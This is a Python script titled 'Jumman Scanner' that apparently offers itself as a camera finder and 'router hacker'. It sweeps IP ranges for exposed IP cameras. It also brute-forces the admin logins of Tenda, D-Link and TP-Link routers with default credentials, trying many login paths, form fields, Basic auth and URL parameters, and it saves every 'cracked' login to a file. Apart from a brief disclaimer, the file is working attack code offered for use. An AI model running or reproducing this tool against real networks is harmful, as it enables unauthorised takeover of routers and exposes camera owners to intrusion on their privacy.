#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🔥 JUMMAN SCANNER - ComeBack EDITION 🔥               ║
║     📷 Camera Scanner + 🌐 Router Hacker                  ║
║     👑 Owner: Jumman                                       ║
║     🔐 Password: ch71                                     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import ipaddress
import subprocess
import re
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import requests

# ============ PASSWORD PROTECTION ============
REQUIRED_PASSWORD = "ch71"

def check_password():
    """Check password before running tool"""
    print("\n" + "=" * 50)
    print("🔐 JUMMAN SCANNER - PASSWORD PROTECTED")
    print("=" * 50)
    print("\n⚠️  This tool is password protected!")
    print("👑 Owner: Jumman")
    print("📱 Version: 3.2\n")
    
    attempts = 3
    for attempt in range(attempts):
        password = input(f"🔑 Enter password ({attempts - attempt} attempts left): ").strip()
        
        if password == REQUIRED_PASSWORD:
            print("\n✅ Access Granted! Loading tool...\n")
            time.sleep(1)
            return True
        else:
            print(f"❌ Wrong password! {attempts - attempt - 1} attempts remaining\n")
    
    print("\n🚫 Access Denied! Too many failed attempts.")
    print("Contact the administrator for access.")
    sys.exit(1)

# ============ BASE SCANNER CLASS ============
class JummanBaseScanner:
    def __init__(self):
        self.results = []
        self.total_ips = 0
        self.scanned = 0
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def validate_ip(self, ip_str):
        try:
            ipaddress.IPv4Address(ip_str)
            return True
        except:
            return False
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return None
    
    def extract_title(self, html_content):
        try:
            match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
            return "No Title"
        except:
            return "No Title"
    
    def scan_range(self, start_ip, end_ip, scan_func):
        """Scan IP range with given scan function"""
        results = []
        try:
            start = int(ipaddress.IPv4Address(start_ip))
            end = int(ipaddress.IPv4Address(end_ip))
            
            if start > end:
                return {'error': 'Start IP must be less than End IP'}
            
            ip_list = []
            for ip_int in range(start, end + 1):
                if ip_int - start > 1000:
                    print("[!] Limited to 1000 IPs for performance")
                    break
                ip_list.append(str(ipaddress.IPv4Address(ip_int)))
            
            self.total_ips = len(ip_list)
            self.scanned = 0
            
            print(f"\n[*] Scanning {self.total_ips} IPs...\n")
            
            with ThreadPoolExecutor(max_workers=150) as executor:
                future_results = executor.map(scan_func, ip_list)
                for result in future_results:
                    self.scanned += 1
                    if self.scanned % 10 == 0:
                        print(f"\r[*] Progress: {self.scanned}/{self.total_ips} IPs", end='')
                        sys.stdout.flush()
                    if result:
                        results.extend(result)
            
            print()
            return results
        except Exception as e:
            return {'error': str(e)}


# ============ CAMERA SCANNER ============
class CameraScanner(JummanBaseScanner):
    def __init__(self):
        super().__init__()
        self.cameras = []
        
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     📷 CAMERA SCANNER - JUMMAN EDITION 📷                 ║
║     🔍 Find IP Cameras on Your Network                     ║
║     👑 Owner: Jumman                                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[✓] Owner: Jumman")
        print(f"[✓] Version: 3.2")
        print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
    
    def get_camera_brand(self, content):
        """Identify camera brand from content"""
        if 'hikvision' in content:
            return 'HIK Vision'
        elif 'dahua' in content:
            return 'Dahua'
        elif 'tenda' in content:
            return 'Tenda'
        elif 'tp-link' in content:
            return 'TP-Link'
        elif 'd-link' in content or 'dlink' in content:
            return 'D-Link'
        elif 'reolink' in content:
            return 'Reolink'
        elif 'amcrest' in content:
            return 'Amcrest'
        elif 'foscam' in content:
            return 'Foscam'
        elif 'axis' in content:
            return 'Axis'
        elif 'sony' in content:
            return 'Sony'
        elif 'panasonic' in content:
            return 'Panasonic'
        else:
            return 'Unknown'
    
    def scan_camera_ip(self, ip):
        """Scan single IP for cameras"""
        results = []
        camera_ports = [80, 8080, 443, 8081, 554, 8000, 37777, 8899, 83, 84, 85]
        
        for port in camera_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    try:
                        protocol = 'https' if port == 443 else 'http'
                        url = f"{protocol}://{ip}:{port}"
                        response = requests.get(url, timeout=2, verify=False, allow_redirects=True)
                        
                        if response.status_code in [200, 401, 403]:
                            content = response.text.lower()
                            title = self.extract_title(response.text)
                            
                            # Camera detection keywords
                            camera_keywords = ['camera', 'cam', 'ipcam', 'web service', 'dvr', 
                                             'hikvision', 'dahua', 'login.asp', 'cgi-bin',
                                             'snapshot', 'video', 'stream', 'live', 'mjpeg',
                                             'ptz', 'network camera', 'ip camera']
                            
                            is_camera = any(kw in content for kw in camera_keywords)
                            
                            if is_camera:
                                brand = self.get_camera_brand(content)
                                results.append({
                                    'ip': ip,
                                    'port': port,
                                    'brand': brand,
                                    'title': title,
                                    'url': url,
                                    'type': 'Camera'
                                })
                    except:
                        pass
            except:
                pass
        
        return results
    
    def scan_cameras(self, start_ip, end_ip):
        """Scan for cameras in IP range"""
        return self.scan_range(start_ip, end_ip, self.scan_camera_ip)
    
    def display_cameras(self, results):
        """Display camera scan results"""
        if not results:
            print("\n❌ No cameras found.")
            return
        
        print("\n" + "=" * 60)
        print("📷 CAMERA SCAN RESULTS")
        print("=" * 60)
        print(f"\n📷 Total Cameras Found: {len(results)}")
        
        print("\n" + "-" * 40)
        print("📷 CAMERA LIST:")
        print("-" * 40)
        
        for i, cam in enumerate(results, 1):
            print(f"\n{i}. {cam['ip']}:{cam['port']}")
            print(f"   Brand: {cam['brand']}")
            print(f"   Title: {cam['title'][:60]}")
            print(f"   URL: {cam['url']}")
        
        print("\n" + "=" * 60)
    
    def save_camera_results(self, results):
        """Save camera results to file"""
        if not results:
            return
        
        filename = f"cameras_{int(time.time())}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("📷 CAMERA SCAN RESULTS - JUMMAN EDITION\n")
                f.write("=" * 60 + "\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Cameras: {len(results)}\n")
                f.write("=" * 60 + "\n\n")
                
                for i, cam in enumerate(results, 1):
                    f.write(f"Camera #{i}\n")
                    f.write(f"IP: {cam['ip']}:{cam['port']}\n")
                    f.write(f"Brand: {cam['brand']}\n")
                    f.write(f"Title: {cam['title']}\n")
                    f.write(f"URL: {cam['url']}\n")
                    f.write("-" * 40 + "\n\n")
            
            print(f"\n✅ Camera results saved to: {filename}")
        except Exception as e:
            print(f"\n❌ Error saving: {e}")
    
    def run(self):
        """Run camera scanner"""
        self.clear_screen()
        self.print_banner()
        
        print("\n⚠️  LEGAL DISCLAIMER:")
        print("This tool is for authorized testing only.")
        print("Unauthorized access to cameras is illegal.\n")
        
        print("📌 SCAN OPTIONS:")
        print("1. Quick Scan (Local Network - 50 IPs)")
        print("2. Custom IP Range")
        print("3. Full Network Scan (All Common Ranges)")
        print("4. Back to Main Menu")
        print()
        
        choice = input("Select option (1-4): ").strip()
        
        if choice == '1':
            local_ip = self.get_local_ip()
            if not local_ip:
                print("❌ Could not detect local network!")
                return
            
            subnet = ".".join(local_ip.split(".")[:3])
            start_ip = f"{subnet}.1"
            end_ip = f"{subnet}.50"
            
            print(f"\n⚡ Quick Scan: {start_ip} - {end_ip}")
            results = self.scan_cameras(start_ip, end_ip)
            
            if isinstance(results, dict) and 'error' in results:
                print(f"\n❌ Error: {results['error']}")
                return
            
            self.display_cameras(results)
            
            if results:
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_camera_results(results)
        
        elif choice == '2':
            print("\n🔍 Enter IP Range:")
            start_ip = input("Start IP: ").strip()
            end_ip = input("End IP: ").strip()
            
            if not self.validate_ip(start_ip) or not self.validate_ip(end_ip):
                print("❌ Invalid IP format!")
                return
            
            results = self.scan_cameras(start_ip, end_ip)
            
            if isinstance(results, dict) and 'error' in results:
                print(f"\n❌ Error: {results['error']}")
                return
            
            self.display_cameras(results)
            
            if results:
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_camera_results(results)
        
        elif choice == '3':
            print("\n🌍 Full Network Scan Started!")
            print("Scanning common ranges...\n")
            
            all_results = []
            ranges = [
                ('192.168.1.1', '192.168.1.254'),
                ('192.168.0.1', '192.168.0.254'),
                ('10.0.0.1', '10.0.0.254'),
                ('172.16.0.1', '172.16.0.254'),
            ]
            
            for start, end in ranges:
                print(f"\n[*] Scanning: {start} - {end}")
                results = self.scan_cameras(start, end)
                if isinstance(results, list):
                    all_results.extend(results)
            
            self.display_cameras(all_results)
            
            if all_results:
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_camera_results(all_results)
        
        elif choice == '4':
            return
        
        else:
            print("❌ Invalid choice!")
        
        input("\nPress Enter to continue...")


# ============ ROUTER SCANNER WITH HACKING ============
class RouterScanner(JummanBaseScanner):
    def __init__(self):
        super().__init__()
        self.routers = []
        self.cracked = []
        
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🌐 ROUTER SCANNER & HACKER - JUMMAN EDITION 🌐        ║
║     🔍 Find Routers & Crack Passwords                      ║
║     💀 Testing: admin, admin1, admin2, admin123           ║
║     👑 Owner: Jumman                                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[✓] Owner: Jumman")
        print(f"[✓] Version: 3.2")
        print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
    
    def get_router_brand(self, content):
        """Identify router brand from content"""
        if 'tenda' in content:
            return 'Tenda'
        elif 'd-link' in content or 'dlink' in content:
            return 'D-Link'
        elif 'tp-link' in content or 'tplink' in content:
            return 'TP-Link'
        elif 'asus' in content:
            return 'ASUS'
        elif 'netgear' in content:
            return 'Netgear'
        elif 'cisco' in content:
            return 'Cisco'
        elif 'linksys' in content:
            return 'Linksys'
        elif 'belkin' in content:
            return 'Belkin'
        elif 'zyxel' in content:
            return 'Zyxel'
        else:
            return 'Unknown'
    
    def test_router_credentials(self, url):
        """Test 4 passwords on router"""
        credentials = [
            ('admin', 'admin'),
            ('admin', 'admin1'),
            ('admin', 'admin2'),
            ('admin', 'admin123')
        ]
        
        login_paths = [
            '/', '/login', '/login.html', '/admin', '/cgi-bin/login',
            '/admin/login', '/system/login', '/goform/login'
        ]
        
        for username, password in credentials:
            for path in login_paths:
                try:
                    test_url = url + path
                    
                    # Try multiple form field variations
                    form_variations = [
                        {'username': username, 'password': password},
                        {'user': username, 'pass': password},
                        {'usr': username, 'pwd': password},
                        {'uname': username, 'pwd': password},
                        {'admin_username': username, 'admin_password': password},
                        {'login': username, 'password': password},
                        {'u': username, 'p': password},
                    ]
                    
                    for form_data in form_variations:
                        try:
                            response = requests.post(test_url, data=form_data, timeout=3, 
                                                    allow_redirects=True, verify=False)
                            
                            if self.is_login_successful(response):
                                return {
                                    'username': username,
                                    'password': password,
                                    'url': test_url
                                }
                        except:
                            pass
                    
                    # Try Basic Authentication
                    try:
                        response = requests.get(test_url, auth=(username, password), 
                                               timeout=3, allow_redirects=True, verify=False)
                        if self.is_login_successful(response):
                            return {
                                'username': username,
                                'password': password,
                                'url': test_url
                            }
                    except:
                        pass
                    
                    # Try URL parameters
                    try:
                        param_url = f"{test_url}?username={username}&password={password}"
                        response = requests.get(param_url, timeout=3, allow_redirects=True, verify=False)
                        if self.is_login_successful(response):
                            return {
                                'username': username,
                                'password': password,
                                'url': param_url
                            }
                    except:
                        pass
                        
                except:
                    pass
        
        return None
    
    def is_login_successful(self, response):
        """Check if login was successful"""
        if response.status_code == 200:
            content = response.text.lower()
            
            # Failure indicators
            failure = ['invalid', 'incorrect', 'failed', 'error', 'denied', 
                      'unauthorized', 'wrong', 'retry', 'try again']
            
            # Success indicators
            success = ['welcome', 'dashboard', 'status', 'configuration', 
                      'logout', 'settings', 'admin', 'main', 'index',
                      'home', 'panel', 'console', 'management', 'network']
            
            if any(s in content for s in success) and not any(f in content for f in failure):
                return True
            
            # Check if content changed from login page
            login_indicators = ['login', 'username', 'password', 'sign in']
            if len(content) > 500 and not any(li in content for li in login_indicators):
                if 'router' in content or 'network' in content or 'status' in content:
                    return True
        
        # Successful redirect
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '').lower()
            if any(p in location for p in ['admin', 'dashboard', 'main', 'index', 'home', 'welcome']):
                return True
        
        return False
    
    def scan_router_ip(self, ip):
        """Scan single IP for routers and try to crack"""
        results = []
        router_ports = [80, 8080, 443, 8081, 81, 82, 8000, 8443]
        
        for port in router_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    try:
                        protocol = 'https' if port == 443 else 'http'
                        url = f"{protocol}://{ip}:{port}"
                        response = requests.get(url, timeout=2, verify=False, allow_redirects=True)
                        
                        if response.status_code in [200, 401, 403]:
                            content = response.text.lower()
                            title = self.extract_title(response.text)
                            
                            # Router detection keywords
                            router_keywords = ['router', 'admin', 'login', 'gateway', 
                                             'tenda', 'd-link', 'tp-link', 'tplink', 'dlink',
                                             'configuration', 'management', 'wireless', 'firewall',
                                             'status', 'system', 'dhcp', 'wan', 'lan']
                            
                            is_router = any(kw in content for kw in router_keywords)
                            
                            if is_router:
                                brand = self.get_router_brand(content)
                                
                                # Only detect specific brands
                                if brand in ['Tenda', 'D-Link', 'TP-Link']:
                                    print(f"\n[🌐] Router Found: {ip}:{port} [{brand}]")
                                    print(f"[*] Testing 4 passwords...")
                                    
                                    # Try to crack
                                    creds = self.test_router_credentials(url)
                                    
                                    if creds:
                                        print(f"[✅] CRACKED! {creds['username']}:{creds['password']}")
                                        self.cracked.append({
                                            'ip': ip,
                                            'port': port,
                                            'brand': brand,
                                            'credentials': creds,
                                            'url': url
                                        })
                                    else:
                                        print(f"[❌] Not cracked")
                                    
                                    results.append({
                                        'ip': ip,
                                        'port': port,
                                        'brand': brand,
                                        'url': url,
                                        'title': title,
                                        'credentials': creds,
                                        'type': 'Router'
                                    })
                    except:
                        pass
            except:
                pass
        
        return results
    
    def scan_routers(self, start_ip, end_ip):
        """Scan for routers in IP range"""
        return self.scan_range(start_ip, end_ip, self.scan_router_ip)
    
    def display_routers(self, results):
        """Display router scan results"""
        if not results:
            print("\n❌ No routers found.")
            return
        
        routers = [r for r in results if r['type'] == 'Router']
        cracked = [r for r in routers if r.get('credentials')]
        
        print("\n" + "=" * 60)
        print("🌐 ROUTER SCAN & HACK RESULTS")
        print("=" * 60)
        print(f"\n🌐 Total Routers Found: {len(routers)}")
        print(f"💀 Cracked: {len(cracked)}")
        
        if routers:
            print("\n" + "-" * 40)
            print("🌐 ROUTER LIST:")
            print("-" * 40)
            
            for i, router in enumerate(routers, 1):
                print(f"\n{i}. {router['ip']}:{router['port']}")
                print(f"   Brand: {router['brand']}")
                print(f"   Title: {router['title'][:60]}")
                print(f"   URL: {router['url']}")
                if router.get('credentials'):
                    cred = router['credentials']
                    print(f"   ✅ CRACKED: {cred['username']}:{cred['password']}")
                    print(f"   🔗 Login: {cred['url']}")
                else:
                    print(f"   ❌ Not Cracked")
        
        if cracked:
            print("\n" + "-" * 40)
            print("💀 CRACKED CREDENTIALS SUMMARY:")
            print("-" * 40)
            for i, c in enumerate(cracked, 1):
                if c.get('credentials'):
                    cred = c['credentials']
                    print(f"\n{i}. {c['ip']} [{c['brand']}]")
                    print(f"   👤 {cred['username']}:{cred['password']}")
                    print(f"   🔗 {cred['url']}")
        
        print("\n" + "=" * 60)
    
    def save_router_results(self, results):
        """Save router results to file"""
        if not results:
            return
        
        routers = [r for r in results if r['type'] == 'Router']
        cracked = [r for r in routers if r.get('credentials')]
        
        filename = f"routers_{int(time.time())}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("🌐 ROUTER SCAN & HACK RESULTS - JUMMAN EDITION\n")
                f.write("=" * 60 + "\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Routers: {len(routers)}\n")
                f.write(f"Cracked: {len(cracked)}\n")
                f.write("=" * 60 + "\n\n")
                
                for i, router in enumerate(routers, 1):
                    f.write(f"Router #{i}\n")
                    f.write(f"IP: {router['ip']}:{router['port']}\n")
                    f.write(f"Brand: {router['brand']}\n")
                    f.write(f"Title: {router['title']}\n")
                    f.write(f"URL: {router['url']}\n")
                    if router.get('credentials'):
                        cred = router['credentials']
                        f.write(f"✅ CRACKED: {cred['username']}:{cred['password']}\n")
                        f.write(f"Login URL: {cred['url']}\n")
                    else:
                        f.write("❌ Not Cracked\n")
                    f.write("-" * 40 + "\n\n")
                
                if cracked:
                    f.write("\n" + "=" * 60 + "\n")
                    f.write("💀 CRACKED CREDENTIALS\n")
                    f.write("=" * 60 + "\n\n")
                    for i, c in enumerate(cracked, 1):
                        if c.get('credentials'):
                            cred = c['credentials']
                            f.write(f"{i}. {c['ip']} [{c['brand']}]\n")
                            f.write(f"   {cred['username']}:{cred['password']}\n")
                            f.write(f"   {cred['url']}\n\n")
            
            print(f"\n✅ Router results saved to: {filename}")
        except Exception as e:
            print(f"\n❌ Error saving: {e}")
    
    def run(self):
        """Run router scanner"""
        self.clear_screen()
        self.print_banner()
        
        print("\n⚠️  LEGAL DISCLAIMER:")
        print("This tool is for authorized testing only.")
        print("Unauthorized access to routers is illegal.\n")
        
        print("💀 PASSWORDS TO TEST:")
        print("   • admin:admin")
        print("   • admin:admin1")
        print("   • admin:admin2")
        print("   • admin:admin123\n")
        
        print("📌 SCAN OPTIONS:")
        print("1. Quick Scan (Local Network - 50 IPs)")
        print("2. Custom IP Range")
        print("3. Full Network Scan (All Common Ranges)")
        print("4. Back to Main Menu")
        print()
        
        choice = input("Select option (1-4): ").strip()
        
        if choice == '1':
            local_ip = self.get_local_ip()
            if not local_ip:
                print("❌ Could not detect local network!")
                return
            
            subnet = ".".join(local_ip.split(".")[:3])
            start_ip = f"{subnet}.1"
            end_ip = f"{subnet}.50"
            
            print(f"\n⚡ Quick Scan: {start_ip} - {end_ip}")
            results = self.scan_routers(start_ip, end_ip)
            
            if isinstance(results, dict) and 'error' in results:
                print(f"\n❌ Error: {results['error']}")
                return
            
            self.display_routers(results)
            
            if results:
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_router_results(results)
        
        elif choice == '2':
            print("\n🔍 Enter IP Range:")
            start_ip = input("Start IP: ").strip()
            end_ip = input("End IP: ").strip()
            
            if not self.validate_ip(start_ip) or not self.validate_ip(end_ip):
                print("❌ Invalid IP format!")
                return
            
            results = self.scan_routers(start_ip, end_ip)
            
            if isinstance(results, dict) and 'error' in results:
                print(f"\n❌ Error: {results['error']}")
                return
            
            self.display_routers(results)
            
            if results:
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_router_results(results)
        
        elif choice == '3':
            print("\n🌍 Full Network Scan Started!")
            print("Scanning common ranges...\n")
            
            all_results = []
            ranges = [
                ('192.168.1.1', '192.168.1.254'),
                ('192.168.0.1', '192.168.0.254'),
                ('10.0.0.1', '10.0.0.254'),
                ('172.16.0.1', '172.16.0.254'),
            ]
            
            for start, end in ranges:
                print(f"\n[*] Scanning: {start} - {end}")
                results = self.scan_routers(start, end)
                if isinstance(results, list):
                    all_results.extend(results)
            
            self.display_routers(all_results)
            
            if all_results:
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_router_results(all_results)
        
        elif choice == '4':
            return
        
        else:
            print("❌ Invalid choice!")
        
        input("\nPress Enter to continue...")


# ============ MAIN MENU ============
class JummanMain:
    def __init__(self):
        self.camera_scanner = CameraScanner()
        self.router_scanner = RouterScanner()
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_main_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🔥 JUMMAN SCANNER - MAIN MENU 🔥                      ║
║     📷 Camera Scanner + 🌐 Router Hacker                  ║
║     👑 Owner: Jumman                                       ║
║     🔐 Password: ch71                                     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[✓] Owner: Jumman")
        print(f"[✓] Version: 3.2")
        print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
    
    def run(self):
        """Main menu loop"""
        while True:
            self.clear_screen()
            self.print_main_banner()
            
            print("\n📌 SELECT MODE:")
            print("=" * 60)
            print("1. 📷 Camera Scanner - Find IP Cameras")
            print("2. 🌐 Router Scanner & Hacker - Find & Crack Routers")
            print("3. ❌ Exit")
            print("=" * 60)
            print()
            
            choice = input("Select option (1-3): ").strip()
            
            if choice == '1':
                self.camera_scanner.run()
            elif choice == '2':
                self.router_scanner.run()
            elif choice == '3':
                print("\n👋 Goodbye!")
                sys.exit(0)
            else:
                print("❌ Invalid choice!")
                time.sleep(1)


# ============ MAIN ============
def main():
    try:
        # Check password first
        check_password()
        
        # Check dependencies
        try:
            import requests
        except ImportError:
            print("[*] Installing requests...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        
        # Run main menu
        app = JummanMain()
        app.run()
        
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()